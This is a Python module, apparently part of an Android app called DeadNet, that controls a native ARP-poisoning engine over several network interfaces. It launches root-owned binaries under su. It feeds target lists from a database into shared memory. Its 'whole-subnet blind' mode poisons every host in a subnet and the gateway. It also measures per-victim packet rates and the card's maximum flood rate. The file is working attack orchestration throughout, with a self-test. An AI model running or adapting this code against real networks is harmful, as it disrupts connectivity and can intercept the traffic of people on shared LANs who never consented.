"""
EmissionController — Python orchestration that bridges the in-memory SQLs (via
the RowReaderArbiter / U2) and the native ``emit.cpp`` ARP emission engine (U4)
for the DeadNet multi-card redesign (work unit U8).

Responsibilities
----------------
  * One native ``emit`` process per Transmitter card. Binaries are copied into
    the app's private dir, chmod 777 + chown root, then launched under ``su``
    detached (``start_new_session=True``) and killed by PID — mirroring
    ``deadnet_apk.py`` exactly.
  * A "pump" thread that periodically reads the attention table through the
    arbiter and republishes each Transmitter's in-focus rowset into its
    shared-memory focus buffer (``arbiter.publish_focus``).
  * A 100ms ``RehydrationStateMaintainer`` thread that reads each card's native
    stats buffer (``arbiter.read_stats``), diffs it to compute per-target tx/s
    and escaped-envelope rates, and upserts ``state`` metric rows through the
    arbiter.
  * A one-shot ``benchmark_card`` helper that measures a card's max packets/sec.

All SQLite access goes THROUGH the arbiter; this module never opens sqlite
itself. Stdlib only. Safe to import off-device (Kivy Logger import guarded; the
device/root-only ``benchmark_card`` is not exercised by the self-test).
"""
from __future__ import annotations

import os
import time
import platform
import threading
import subprocess
from typing import Callable, Dict, List, Optional

try:  # package import (app runs with apk/ on sys.path)
    from engine.contracts import (
        DB_ATTENTION, DB_STATE, DB_KNOWN_SCENTS,
        AttentionEntry, NetInfo, Knobs, EmitMode,
        FOCUS_FILE_SIZE, STATS_FILE_SIZE,
        now_ms,
    )
except ImportError:  # running as a bare script: put apk/ on sys.path
    import sys as _sys
    _sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from engine.contracts import (  # noqa: E501
        DB_ATTENTION, DB_STATE, DB_KNOWN_SCENTS,
        AttentionEntry, NetInfo, Knobs, EmitMode,
        FOCUS_FILE_SIZE, STATS_FILE_SIZE,
        now_ms,
    )

try:  # logging is optional off-device
    from kivy.logger import Logger as _Logger

    def _log(msg: str) -> None:
        _Logger.info("Emission: %s" % msg)
except Exception:  # pragma: no cover - bare test env
    def _log(msg: str) -> None:
        pass


# Asset arch naming: assets are emit.arm64 / emit.arm / emit.x86 / emit.x86_64.
# platform.machine() -> asset suffix (brief's final mapping).
_BINARY_MAP = {
    "x86_64": "x86_64",
    "aarch64": "arm64",
    "armv7l": "arm",
    "arm": "arm",
    "i686": "x86",
    "i386": "x86",
}


def _arch_suffix() -> str:
    arch = _BINARY_MAP.get(platform.machine())
    if not arch:
        raise RuntimeError("unsupported device architecture: %r" % platform.machine())
    return arch


class Transmitter:
    """Per-card emission state registered with the controller."""
    __slots__ = ("iface", "net", "our_mac", "gateway_mac", "net_id",
                 "proc", "pid", "emit_path")

    def __init__(self, iface: str, net: NetInfo, our_mac: str,
                 gateway_mac: str, net_id: str):
        self.iface = iface
        self.net = net
        self.our_mac = our_mac
        self.gateway_mac = gateway_mac
        self.net_id = net_id
        self.proc: Optional[subprocess.Popen] = None
        self.pid: Optional[int] = None
        self.emit_path: Optional[str] = None


class EmissionController:
    """Bridges SQLite (attention/state) and the native emit.cpp engine, one
    native process per Transmitter card, plus a pump thread + the rehydration
    state maintainer."""

    def __init__(self, arbiter, appdir: str, knobs: Knobs):
        self._arb = arbiter
        self.appdir = appdir
        self._knobs = knobs

        self._transmitters: Dict[str, Transmitter] = {}
        self._emit_path: Optional[str] = None

        self._pump_stop = threading.Event()
        self._pump_thread: Optional[threading.Thread] = None
        self._rehydrator: Optional[RehydrationStateMaintainer] = None

        # UNFOCUSED whole-subnet blind targeting: every host IP in this /24 is
        # poisoned even if never smelled. Identified hosts (attention table) keep
        # their real MAC + weight so the bird still hones; blind hosts carry an
        # empty MAC => emit broadcasts the victim-side poison and still poisons
        # the gateway by victim IP. Empty => disabled (focused fork).
        self._blind_hosts: List[str] = []

        self._started = False
        self._lock = threading.Lock()

    # ---------------------------------------------- whole-subnet blind (U-fork)
    def set_whole_subnet_blind(self, subnet_cidr: Optional[str],
                               our_ip: str = "", gw_ip: str = "") -> int:
        """Enable UNFOCUSED whole-/24 blind targeting from `subnet_cidr`. Every
        host address (minus network/broadcast, our own IP, the gateway IP) is
        added to the published focus set each pump cycle with an unknown (empty)
        MAC, so the attack lands even on an isolated LAN where `smell` can't see
        the hosts (how vanilla DeadNet "just works"). Pass None/"" to disable
        (focused fork). Returns the number of blind hosts enabled."""
        hosts: List[str] = []
        if subnet_cidr:
            try:
                import ipaddress
                net = ipaddress.ip_network(subnet_cidr, strict=False)
                excl = {our_ip, gw_ip,
                        str(net.network_address), str(net.broadcast_address)}
                hosts = [str(h) for h in net.hosts() if str(h) not in excl]
            except ValueError as exc:
                _log("blind subnet %r invalid: %r" % (subnet_cidr, exc))
                hosts = []
        self._blind_hosts = hosts
        _log("whole-subnet blind: %d hosts" % len(hosts))
        return len(hosts)

    # ------------------------------------------------------------- shm paths
    def _focus_path(self, iface: str) -> str:
        return os.path.join(self.appdir, "focus_%s.shm" % iface)

    def _stats_path(self, iface: str) -> str:
        return os.path.join(self.appdir, "stats_%s.shm" % iface)

    # ----------------------------------------------------------- registration
    def add_transmitter(self, iface: str, net: NetInfo,
                        our_mac: str = "", gateway_mac: Optional[str] = None,
                        net_id: Optional[str] = None) -> Transmitter:
        """Register a Transmitter card. Pre-creates the focus + stats shm files
        so both the arbiter and emit.cpp agree on a zeroed, correctly sized
        buffer before the native process starts."""
        gw = gateway_mac if gateway_mac is not None else (net.gateway_mac or "")
        nid = net_id if net_id is not None else (net.subnet_cidr or net.iface or iface)

        tx = Transmitter(iface=iface, net=net, our_mac=our_mac,
                         gateway_mac=gw, net_id=nid)
        self._transmitters[iface] = tx

        # Pre-create stats file (zeroed) and focus file (empty set publish).
        self._arb.ensure_stats_file(iface)
        self._arb.publish_focus(iface, [], self._knobs.emit_mode,
                                tx.gateway_mac, tx.our_mac)
        _log("registered transmitter %s (net_id=%s gw=%s our=%s)"
             % (iface, nid, gw, our_mac))
        return tx

    # ----------------------------------------------------------------- binary
    def _copy_binary(self) -> str:
        """Copy emit.<arch> into appdir, chmod 777 + chown root (mirror
        deadnet_apk._prepare_binaries). Returns the destination path."""
        arch = _arch_suffix()
        assets = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "assets")
        src = os.path.join(assets, "emit.%s" % arch)
        dst = os.path.join(self.appdir, "emit.%s" % arch)
        subprocess.run("su -c 'cp -rf %s %s'" % (src, dst), shell=True, check=True)
        subprocess.run("su -c 'chmod 777 %s'" % dst, shell=True, check=True)
        subprocess.run("su -c 'chown root %s'" % dst, shell=True, check=True)
        _log("copied emit binary -> %s" % dst)
        return dst

    def _launch(self, tx: Transmitter) -> None:
        publish_ms = max(1, int(self._knobs.state_refresh_ms))
        cmd = "%s %s %s %s %d" % (tx.emit_path, tx.iface,
                                  self._focus_path(tx.iface),
                                  self._stats_path(tx.iface), publish_ms)
        proc = subprocess.Popen(
            ["su", "-c", cmd],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        tx.proc = proc
        tx.pid = proc.pid
        _log("started emit for %s proc_id %s" % (tx.iface, proc.pid))

    # ------------------------------------------------------------------- start
    def start(self) -> None:
        with self._lock:
            if self._started:
                return
            self._started = True

        self._emit_path = self._copy_binary()
        for tx in self._transmitters.values():
            tx.emit_path = self._emit_path
            self._launch(tx)

        # pump thread: republish attention -> focus buffers
        self._pump_stop.clear()
        self._pump_thread = threading.Thread(
            target=self._pump_loop, name="emission-pump", daemon=True)
        self._pump_thread.start()

        # rehydration state maintainer (100ms)
        self._rehydrator = RehydrationStateMaintainer(
            self._arb, lambda: list(self._transmitters.values()), self._knobs)
        self._rehydrator.start()

    # -------------------------------------------------------------- pump logic
    def _pump_once(self) -> None:
        """One pass: read the attention table for each transmitter's net and
        republish its in-focus rowset into the shared focus buffer."""
        for tx in list(self._transmitters.values()):
            try:
                entries = self._read_attention(tx)
                if self._blind_hosts:
                    # cover the whole subnet: add a blind (empty-MAC) entry for
                    # every host not already represented (by IP) in attention,
                    # so identified hosts keep their real MAC + honed weight.
                    have = {e.ip for e in entries if e.ip}
                    for ip in self._blind_hosts:
                        if ip in have:
                            continue
                        entries.append(AttentionEntry(
                            mac="", ip=ip, net_id=tx.net_id,
                            weight=1.0, pinned=False))
                self._arb.publish_focus(tx.iface, entries,
                                        self._knobs.emit_mode,
                                        tx.gateway_mac, tx.our_mac)
            except Exception as exc:  # noqa: BLE001 - never kill the pump
                _log("pump failed for %s: %r" % (tx.iface, exc))

    def _read_attention(self, tx: Transmitter) -> List[AttentionEntry]:
        if tx.net_id:
            rows = self._arb.read(
                DB_ATTENTION,
                "SELECT mac, ip, net_id, weight, pinned FROM attention "
                "WHERE net_id=?", (tx.net_id,))
        else:
            rows = self._arb.read(
                DB_ATTENTION,
                "SELECT mac, ip, net_id, weight, pinned FROM attention")
        out: List[AttentionEntry] = []
        for mac, ip, net_id, weight, pinned in rows:
            out.append(AttentionEntry(mac=mac, ip=ip, net_id=net_id or "",
                                      weight=float(weight),
                                      pinned=bool(pinned)))
        return out

    def _pump_loop(self) -> None:
        interval = max(0.001, self._knobs.mac_vacuum_interval_ms / 1000.0)
        while not self._pump_stop.is_set():
            self._pump_once()
            self._pump_stop.wait(interval)

    # -------------------------------------------------------------------- stop
    @staticmethod
    def _kill_proc(tx: Transmitter) -> None:
        """Kill one emit proc by PID and by path (mirror deadnet_apk._kill_proc;
        pkill alone is unreliable on toybox so we SIGKILL the PID too)."""
        if tx.pid is None and tx.proc is None:
            return
        try:
            if tx.pid is not None:
                subprocess.run(["su", "-c", "kill -9 %d" % tx.pid],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True)
            if tx.emit_path:
                subprocess.run(["su", "-c", "pkill -f %s" % tx.emit_path],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True)
            if tx.proc is not None:
                try:
                    tx.proc.wait(timeout=5.0)
                except Exception:
                    pass
            _log("killed emit %s (pid %s)" % (tx.iface, tx.pid))
        except Exception as exc:  # noqa: BLE001
            _log("failed to kill emit %s: %r" % (tx.iface, exc))
        finally:
            tx.proc = None
            tx.pid = None

    def stop(self) -> None:
        """Stop threads + kill every emit proc. Idempotent."""
        self._pump_stop.set()
        if self._pump_thread is not None:
            self._pump_thread.join(timeout=5.0)
            self._pump_thread = None

        if self._rehydrator is not None:
            self._rehydrator.stop()
            self._rehydrator = None

        for tx in self._transmitters.values():
            self._kill_proc(tx)

        self._started = False


class RehydrationStateMaintainer:
    """Background thread that, every ``knobs.state_refresh_ms`` (default 100ms),
    reads each transmitter's native stats buffer, diffs it against the previous
    snapshot to compute per-target tx/s and escaped-envelope rates, and upserts
    ``StateMetric`` rows into DB_STATE through the arbiter. Never raises out of
    its loop."""

    def __init__(self, arbiter, transmitters_provider: Callable[[], list],
                 knobs: Knobs):
        self._arb = arbiter
        self._provider = transmitters_provider
        self._knobs = knobs

        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None

        # Per-iface previous snapshot: {"ts": ms, "stats": {ip: tx_pkts},
        #                               "escaped": {key: escaped_pkts}}
        self._prev: Dict[str, dict] = {}

        # Escaped-envelope source hook, fed later by the sniffer (U9).
        # Returns {ip_or_mac: escaped_pkts_cumulative}.
        self._escaped_source: Optional[Callable[[], Dict[str, int]]] = None

    def set_escaped_source(self, fn: Callable[[], Dict[str, int]]) -> None:
        """Install the callable that reports cumulative escaped (leaked) packet
        counts per target, keyed by ip or mac. U9/sniffer wires this up."""
        self._escaped_source = fn

    # ---------------------------------------------------------------- compute
    def _compute_pps_enabled(self) -> bool:
        # Skip the expensive per-electronic pps compute in unfocused mode unless
        # the owner asked for it everywhere.
        return (self._knobs.emit_mode == EmitMode.FOCUSED
                or not self._knobs.compute_pps_focused_only)

    def _escaped_map(self) -> Dict[str, int]:
        if self._escaped_source is None:
            return {}
        try:
            m = self._escaped_source()
            return dict(m) if m else {}
        except Exception as exc:  # noqa: BLE001
            _log("escaped source failed: %r" % exc)
            return {}

    def _ip_mac_map(self) -> Dict[str, str]:
        """INTEGRATION SEAM: emit.cpp keys stats by IP, but the metrics table PK
        is mac. Resolve ip->mac from the master store so BirdObserver (which reads
        metrics by mac) and the attention list line up. Cheap read per cycle."""
        try:
            rows = self._arb.read(
                DB_KNOWN_SCENTS,
                "SELECT ip, mac FROM scents WHERE ip != '' AND mac != ''")
            return {ip: mac for ip, mac in rows}
        except Exception as exc:  # noqa: BLE001
            _log("ip->mac map failed: %r" % exc)
            return {}

    @staticmethod
    def _resolve_mac(key: str, ipmap: Dict[str, str]) -> str:
        """A stats/escaped key is an IPv4 (from emit.cpp) or already a mac
        (from a sniffer escaped-source). Map IPv4->mac when known; otherwise
        keep the key verbatim so no metric is silently dropped."""
        if ":" in key:            # already a mac
            return key
        return ipmap.get(key, key)  # ip -> mac, else fall back to the ip string

    def _rehydrate_once(self) -> None:
        compute_pps = self._compute_pps_enabled()
        now = now_ms()
        escaped_all = self._escaped_map()
        ipmap = self._ip_mac_map()          # ip -> mac (seam: emit.cpp stats are ip-keyed)

        for tx in self._provider():
            iface = getattr(tx, "iface", tx)
            try:
                stats = self._arb.read_stats(iface)  # {ip: (tx_pkts, tx_bytes)}
            except Exception as exc:  # noqa: BLE001
                _log("read_stats failed for %s: %r" % (iface, exc))
                continue

            prev = self._prev.get(iface)
            dt_s = ((now - prev["ts"]) / 1000.0) if prev else 0.0
            prev_stats = prev["stats"] if prev else {}
            prev_esc = prev["escaped"] if prev else {}

            keys = set(stats.keys()) | set(escaped_all.keys())
            for key in keys:
                tx_pkts = stats.get(key, (0, 0))[0]
                esc_now = int(escaped_all.get(key, 0))

                tx_pps = 0.0
                if compute_pps and dt_s > 0.0:
                    tx_pps = max(0.0, (tx_pkts - prev_stats.get(key, 0)) / dt_s)

                escaped_pps = 0.0
                if dt_s > 0.0:
                    escaped_pps = max(0.0, (esc_now - prev_esc.get(key, 0)) / dt_s)

                compliant = 1 if escaped_pps == 0 else 0
                mac = self._resolve_mac(key, ipmap)   # ip->mac so PK aligns w/ BirdObserver

                try:
                    self._arb.write_async(
                        DB_STATE,
                        "INSERT INTO metrics(mac, escaped_pkts, tx_pps, "
                        "compliant, updated_ms) VALUES(?,?,?,?,?) "
                        "ON CONFLICT(mac) DO UPDATE SET "
                        "escaped_pkts=excluded.escaped_pkts, "
                        "tx_pps=excluded.tx_pps, "
                        "compliant=excluded.compliant, "
                        "updated_ms=excluded.updated_ms",
                        (mac, esc_now, float(tx_pps), compliant, now))
                except Exception as exc:  # noqa: BLE001
                    _log("state upsert failed for %s/%s: %r" % (iface, key, exc))

            # record snapshot for the next diff
            self._prev[iface] = {
                "ts": now,
                "stats": {k: v[0] for k, v in stats.items()},
                "escaped": dict(escaped_all),
            }

    # ------------------------------------------------------------------- loop
    def _loop(self) -> None:
        interval = max(0.001, self._knobs.state_refresh_ms / 1000.0)
        while not self._stop.is_set():
            try:
                self._rehydrate_once()
            except Exception as exc:  # noqa: BLE001 - never die
                _log("rehydrate loop error: %r" % exc)
            self._stop.wait(interval)

    def start(self) -> None:
        if self._thread is not None:
            return
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._loop, name="rehydration-maintainer", daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=5.0)
            self._thread = None


# ===========================================================================
# Device/root-only card benchmark. Import-safe; the self-test does NOT run it.
# ===========================================================================
def _sum_tx(stats: Dict[str, tuple]) -> int:
    return sum(int(v[0]) for v in stats.values())


def benchmark_card(emit_path: str, iface: str, arbiter, appdir: str,
                   duration_s: float = 2.0) -> int:
    """Measure a card's max packets/sec: publish a few dummy targets in
    UNFOCUSED/0ttl, run emit for ``duration_s``, sample read_stats start/end,
    return total tx_pkts/elapsed as int pps. Device/root-only."""
    dummies = [AttentionEntry(mac="", ip="10.0.0.%d" % i, weight=1.0)
               for i in range(2, 6)]
    arbiter.publish_focus(iface, dummies, EmitMode.UNFOCUSED, "", "")

    focus_path = os.path.join(appdir, "focus_%s.shm" % iface)
    stats_path = arbiter.ensure_stats_file(iface)

    cmd = "%s %s %s %s %d" % (emit_path, iface, focus_path, stats_path, 200)
    proc = subprocess.Popen(
        ["su", "-c", cmd],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True)
    try:
        time.sleep(0.25)  # warmup before first sample
        start = _sum_tx(arbiter.read_stats(iface))
        t0 = time.time()
        time.sleep(max(0.1, float(duration_s)))
        end = _sum_tx(arbiter.read_stats(iface))
        t1 = time.time()
    finally:
        try:
            subprocess.run(["su", "-c", "kill -9 %d" % proc.pid],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            subprocess.run(["su", "-c", "pkill -f %s" % emit_path],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            try:
                proc.wait(timeout=5.0)
            except Exception:
                pass
        except Exception:
            pass

    elapsed = t1 - t0
    return int((end - start) / elapsed) if elapsed > 0 else 0


# ===========================================================================
# Self-test (no device / no root; does NOT launch emit.cpp).
#   cd apk && python3 engine/emission.py
# ===========================================================================
def _selftest() -> None:
    import struct
    import tempfile
    from engine.contracts import FOCUS_HEADER_FMT, FOCUS_FLAG_0TTL
    from engine.arbiter import (
        RowReaderArbiter, _ip_to_be_u32, _SEQ_FMT,
    )
    from engine.contracts import (
        STATS_HEADER_FMT, STATS_ENTRY_FMT, STATS_HEADER_SIZE, STATS_ENTRY_SIZE,
    )
    import mmap

    tmp = tempfile.mkdtemp(prefix="emit_selftest_")
    arb = RowReaderArbiter(appdir=tmp)
    ctrl = None
    try:
        knobs = Knobs()   # emit_mode defaults to UNFOCUSED

        # --- 1. pump: attention rows -> focus buffer --------------------------
        net_id = "192.168.1.0/24"
        rows = [
            ("de:ad:be:ef:00:01", "192.168.1.10", 1.0),
            ("de:ad:be:ef:00:02", "192.168.1.20", 2.0),
            ("de:ad:be:ef:00:03", "192.168.1.30", 1.0),
        ]
        for mac, ip, w in rows:
            arb.write(DB_ATTENTION,
                      "INSERT INTO attention(mac, ip, net_id, weight) "
                      "VALUES(?,?,?,?)", (mac, ip, net_id, w))

        net = NetInfo(iface="wlan0", subnet_cidr=net_id,
                      gateway_mac="00:11:22:33:44:55")
        ctrl = EmissionController(arb, tmp, knobs)
        ctrl.add_transmitter("wlan0", net, our_mac="66:77:88:99:aa:bb")

        ctrl._pump_once()

        with open(os.path.join(tmp, "focus_wlan0.shm"), "rb") as f:
            buf = f.read()
        assert len(buf) == FOCUS_FILE_SIZE, len(buf)
        seq_, mode_, count_, gen_, gwb, ourb, flags_ = struct.unpack_from(
            FOCUS_HEADER_FMT, buf, 0)
        assert seq_ % 2 == 0, seq_
        assert count_ == 3, count_
        assert mode_ == 0, mode_            # UNFOCUSED
        assert flags_ & FOCUS_FLAG_0TTL, flags_
        print("  [1] pump: attention(3) -> focus count=%d seq=%d ... ok"
              % (count_, seq_))

        # --- 1b. whole-subnet blind: pump injects blind (empty-MAC) entries ---
        n_blind = ctrl.set_whole_subnet_blind(
            "10.9.9.0/29", our_ip="10.9.9.2", gw_ip="10.9.9.1")
        assert n_blind == 4, n_blind     # hosts .1-.6 minus gw(.1) our(.2)
        ctrl._pump_once()
        with open(os.path.join(tmp, "focus_wlan0.shm"), "rb") as f:
            buf = f.read()
        _, _, count1b, _, _, _, _ = struct.unpack_from(FOCUS_HEADER_FMT, buf, 0)
        assert count1b == 3 + 4, count1b   # 3 identified + 4 blind
        ctrl.set_whole_subnet_blind(None)  # disable; back to attention-only
        ctrl._pump_once()
        with open(os.path.join(tmp, "focus_wlan0.shm"), "rb") as f:
            buf = f.read()
        _, _, count1c, _, _, _, _ = struct.unpack_from(FOCUS_HEADER_FMT, buf, 0)
        assert count1c == 3, count1c
        print("  [1b] blind /29 -> +4 entries (count=%d), disable -> %d ... ok"
              % (count1b, count1c))

        # --- 2. rehydration: hand-write a stats buffer with 2 targets ---------
        iface = "wlan1"
        stats_path = arb.ensure_stats_file(iface)
        targets = {"192.168.1.10": (54321, 3000000),
                   "192.168.1.20": (12000, 700000)}
        with open(stats_path, "r+b") as f:
            mm = mmap.mmap(f.fileno(), STATS_FILE_SIZE)
            try:
                struct.pack_into(_SEQ_FMT, mm, 0, 1)             # seq -> odd
                struct.pack_into(STATS_HEADER_FMT, mm, 0,
                                 1, len(targets), 1700000000000)
                off = STATS_HEADER_SIZE
                for ip, (p, b) in targets.items():
                    struct.pack_into(STATS_ENTRY_FMT, mm, off,
                                     _ip_to_be_u32(ip), p, b, 0)
                    off += STATS_ENTRY_SIZE
                struct.pack_into(_SEQ_FMT, mm, 0, 2)             # seq -> even
                mm.flush()
            finally:
                mm.close()

        class _T:
            iface = "wlan1"

        rsm = RehydrationStateMaintainer(arb, lambda: [_T()], knobs)
        rsm._rehydrate_once()

        # barrier: blocking write flushes the async upserts
        arb.write(DB_STATE,
                  "INSERT INTO metrics(mac) VALUES('__barrier__') "
                  "ON CONFLICT(mac) DO NOTHING")
        got = arb.read(DB_STATE,
                       "SELECT mac, escaped_pkts, tx_pps, compliant, updated_ms "
                       "FROM metrics WHERE mac LIKE '192.168.1.%' ORDER BY mac")
        assert len(got) == 2, got
        for mac, esc, pps, comp, upd in got:
            assert esc == 0, (mac, esc)              # no escaped source wired
            assert pps == 0.0, (mac, pps)            # unfocused / first iter
            assert comp == 1, (mac, comp)            # escaped_pps == 0
            assert upd > 0, (mac, upd)
        print("  [2] rehydration: stats(2) -> %d metric rows ....... ok"
              % len(got))

    finally:
        if ctrl is not None:
            # stop() would try to join the (unstarted) threads only; no procs.
            ctrl._pump_stop.set()
        arb.close()
        try:
            for fn in os.listdir(tmp):
                os.remove(os.path.join(tmp, fn))
            os.rmdir(tmp)
        except Exception:
            pass

    print("U8 PASS")


if __name__ == "__main__":
    _selftest()
